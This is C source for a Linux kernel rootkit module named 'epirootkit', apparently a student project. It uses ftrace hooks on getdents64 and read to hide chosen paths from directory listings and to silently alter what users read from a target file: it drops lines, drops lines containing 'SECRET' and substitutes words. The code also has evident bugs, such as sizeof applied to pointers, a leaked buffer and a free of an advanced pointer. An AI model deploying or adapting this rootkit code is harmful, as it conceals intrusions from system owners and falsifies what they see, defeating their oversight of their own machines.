#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/string.h>

#include "epirootkit.h"

/*
 * regs->di       <- RDI <- 1st argument (so the file descriptor for read)
 * regs->si       <- RSI <- 2nd argument (user‐buf pointer)
 * regs->dx       <- RDX <- 3rd argument (count)
 */

// Directory entry structure as 'returned' (by pointer) by getdents64 syscall
// Used to read a directory content
// If I do not define it here, I have a compilation error... does not seem to be included in linux headers
// (tried dirent.h, with no success)
// (at least not in the ones I have on my system LOL)
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

// Structure to hold hidden directory names
struct hidden_dir_entry {
    char *dirname;
    struct list_head list;
};

static LIST_HEAD(hidden_dirs_list);
static DEFINE_SPINLOCK(hidden_dirs_lock);

// Function prototypes
int add_hidden_dir(const char *dirname);
int remove_hidden_dir(const char *dirname);
int is_hidden(const char *name);

// Hooks declaration
asmlinkage int getdents64_hook(const struct pt_regs *regs);
asmlinkage long openat_hook(const struct pt_regs *regs);

/**
 * @brief Adds a directory name to the dynamic hidden directories list.
 *
 * @dirname: The directory name to remove.
 * @return 0 on success or a negative error code on failure.
 */
int add_hidden_dir(const char *dirname) {
    struct hidden_dir_entry *entry;

    if (is_hidden(dirname))
        return 0;

    // Maybe need to improve this part...
    bool is_path = dirname[0] == '/';
    if (!is_path) {
        ERR_MSG("hooks: please provide a valid full‑path entry.\n");
        return -EINVAL;
    }

    // Allocate memory for the new hidden directory entry.
    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry)
        return -ENOMEM;

    // Duplicate the directory name to store it safely.
    entry->dirname = kstrdup(dirname, GFP_KERNEL);
    if (!entry->dirname) {
        kfree(entry);
        return -ENOMEM;
    }

    // Acquire the spinlock to modify the list.
    spin_lock(&hidden_dirs_lock);
    list_add_tail(&entry->list, &hidden_dirs_list);
    spin_unlock(&hidden_dirs_lock);

    DBG_MSG("hooks: added %s file or directory\n", entry->dirname);

    return 0;
}

/**
 * @brief Removes a directory name from the dynamic hidden directories list.
 *
 * @dirname: The directory name to remove.
 * @return 0 on success or -ENOENT if the directory name is not found.
 */
int remove_hidden_dir(const char *dirname) {
    struct hidden_dir_entry *entry;
    int found = 0;

    // Acquire the spinlock for safe list traversal and modification.
    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        if (strcmp(entry->dirname, dirname) == 0) {
            list_del(&entry->list);
            kfree(entry->dirname);
            kfree(entry);
            found = 1;
            break;
        }
    }
    spin_unlock(&hidden_dirs_lock);

    return found ? 0 : -ENOENT;
}

/**
 * @brief Checks if a given directory name is in the hidden list.
 *
 * @name: The directory name to check.
 * @return 1 if the directory is to be hidden, 0 otherwise.
 */
int is_hidden(const char *name) {
    struct hidden_dir_entry *entry;
    int hidden = 0;

    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        if (strcmp(entry->dirname, name) == 0) {
            hidden = 1;
            break;
        }
    }
    spin_unlock(&hidden_dirs_lock);
    return hidden;
}

int list_hidden_dirs(char *buf, size_t buf_size) {
    struct hidden_dir_entry *entry;
    size_t len = 0;

    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        len += scnprintf(buf + len, buf_size - len, "%s\n", entry->dirname);
        if (len >= buf_size - 1)
            break;
    }
    spin_unlock(&hidden_dirs_lock);

    return len;
}

// Original syscall pointers
asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);

// Function to hook the getdents64 syscall
asmlinkage int getdents64_hook(const struct pt_regs *regs) {
    int ret;
    int fd = (int)regs->di;
    struct file *dir_f;
    struct path parent_path;
    char *dirbuf = kmalloc(512, GFP_KERNEL);
    char *dirstr = NULL;

    dir_f = fget(fd);
    if (dir_f) {
        parent_path = dir_f->f_path;
        path_get(&parent_path);
        dirstr = d_path(&parent_path, dirbuf, sizeof(dirbuf));
        path_put(&parent_path);
        fput(dir_f);
    }

    // Get the pointer to the directory entrues buffer
    struct linux_dirent64 __user *user_dir =
        (struct linux_dirent64 __user *)regs->si;

    // Get the size of the buffer
    // unsigned int count = (unsigned int)regs->dx;

    // Call the original getdents64 syscall, to have the buffer updated
    // Next, we just need to check directories in the buffer,
    // remove the ones we don't want, and copy the buffer to user space
    ret = __orig_getdents64(regs);
    if (ret < 0)
        return ret;

    // Allocate a temporary buffer in kernel space for copying and processing
    // the entries. Next copy the buffer from user space to kernel space.
    char *kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }

    // Current position in the kbuf buffer for processing entries
    unsigned int offset = 0;

    // Allocate a second temporary buffer to store the non-hidden directory
    // entries
    char *newbuf = kmalloc(ret, GFP_KERNEL);
    if (!newbuf) {
        kfree(kbuf);
        return ret;
    }

    unsigned int new_size = ret;
    unsigned int new_off = 0;

    // Loop through the entries in the buffer
    // Check if the entry is hidden or not
    while (offset < ret) {
        struct linux_dirent64 *d = (void *)(kbuf + offset);
        int reclen = d->d_reclen;

        // Build full path to be more precise than before
        bool hide = false;
        if (dirstr) {
            char *fullpath = kmalloc(PATH_MAX, GFP_KERNEL);
            int len;

            if (strcmp(dirstr, "/") == 0) {
                len = snprintf(fullpath, sizeof(fullpath), "/%s", d->d_name);
            }
            else {
                len = snprintf(fullpath, sizeof(fullpath), "%s/%s", dirstr, d->d_name);
            }

            if (len > 0 && len < sizeof(fullpath) && is_hidden(fullpath))
                hide = true;
				
			kfree(fullpath);
        }

        if (hide)
            new_size -= reclen;
        else {
            memcpy(newbuf + new_off, d, reclen);
            new_off += reclen;
        }
        offset += reclen;
    }

    // Copy the modified new buffer back to the user-space buffer to replace the original buf
    if (copy_to_user(user_dir, newbuf, new_size)) {
        kfree(kbuf);
        kfree(newbuf);
        return ret;
    }

    kfree(kbuf);
    kfree(newbuf);
    kfree(dirbuf);

    // New size without directories we do not want...
    return new_size;
}

#define FILTER_FILE "/test.txt"
#define HIDE_LINE_NUMBER 3
#define HIDE_SUBSTRING "SECRET"
#define REPLACE_SRC "efrei"
#define REPLACE_DST "epita"

static asmlinkage long (*__orig_read)(const struct pt_regs *regs);
static asmlinkage long read_hook(const struct pt_regs *regs);

static bool is_target_file(int fd) {
    struct file *f;
    struct path path;
    char *tmp;
    bool match = false;
    char *buf = kmalloc(1024, GFP_KERNEL); // 🧠 Heap instead of stack

    if (!buf)
        return false;

    f = fget(fd);
    if (!f) {
        kfree(buf);
        return false;
    }

    path = f->f_path;
    path_get(&path);

    tmp = d_path(&path, buf, 1024);
    if (!IS_ERR(tmp) && strcmp(tmp, FILTER_FILE) == 0)
        match = true;

    path_put(&path);
    fput(f);
    kfree(buf);
    return match;
}

asmlinkage long read_hook(const struct pt_regs *regs) {
    // Call the original read syscall first
    long ret = __orig_read(regs);
    if (ret <= 0)
        return ret;

    // Check if the file descriptor is the one we want to filter
    int fd = regs->di;
    if (!is_target_file(fd))
        return ret;

    // Copy user buffer to kernel
    char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, (char __user *)regs->si, ret)) {
        kfree(kbuf);
        return ret;
    }

    // Safety null-terminate the buffer
    // (not sure if this is needed, but better safe than sorry)
    kbuf[ret] = '\0';

    // Prepare output buffer (we double the output just in case replacement string is longer)
    // Maybe not the best solution... to improve later
    char *out = kmalloc(ret * 2 + 1, GFP_KERNEL);
    if (!out) {
        kfree(kbuf);
        return ret;
    }
    char *line;
    int line_number = 0;
    size_t out_len = 0;

    line = strsep(&kbuf, "\n");

    while (line) {
        line_number++;
        bool skip = false;
        char *p;

        // Hide a line
        if (HIDE_LINE_NUMBER > 0 && line_number == HIDE_LINE_NUMBER)
            skip = true;

        // Hide a line from keyword
        if (!skip && HIDE_SUBSTRING && strstr(line, HIDE_SUBSTRING))
            skip = true;

        // Hide a keyword and replace it by something else
        if (!skip) {
            char *seg = line;
            while ((p = strstr(seg, REPLACE_SRC))) {
                // Copy up to matching string
                size_t distance_before = p - seg;
                memcpy(out + out_len, seg, distance_before);
                out_len += distance_before;

                // Copy replacement string
                size_t len_string_src = strlen(REPLACE_SRC);
                size_t len_string_dst = strlen(REPLACE_DST);
                memcpy(out + out_len, REPLACE_DST, len_string_dst);
                out_len += len_string_dst;
                seg = p + len_string_src;
            }

            // Copy remainder string
            strcpy(out + out_len, seg);
            out_len += strlen(seg);

            // Add newline back
            out[out_len++] = '\n';
        }

        line = strsep(&kbuf, "\n");
    }

    out[out_len] = '\0';

    // Copy filtered data back to user
    if (copy_to_user((char __user *)regs->si, out, out_len))
        ret = ret;
    else
        ret = out_len;

    kfree(out);
    kfree(kbuf);
    return ret;
}

// Array of hooks to install.
size_t hook_array_size = 2;
struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64),
    HOOK("sys_read", read_hook, &__orig_read)
};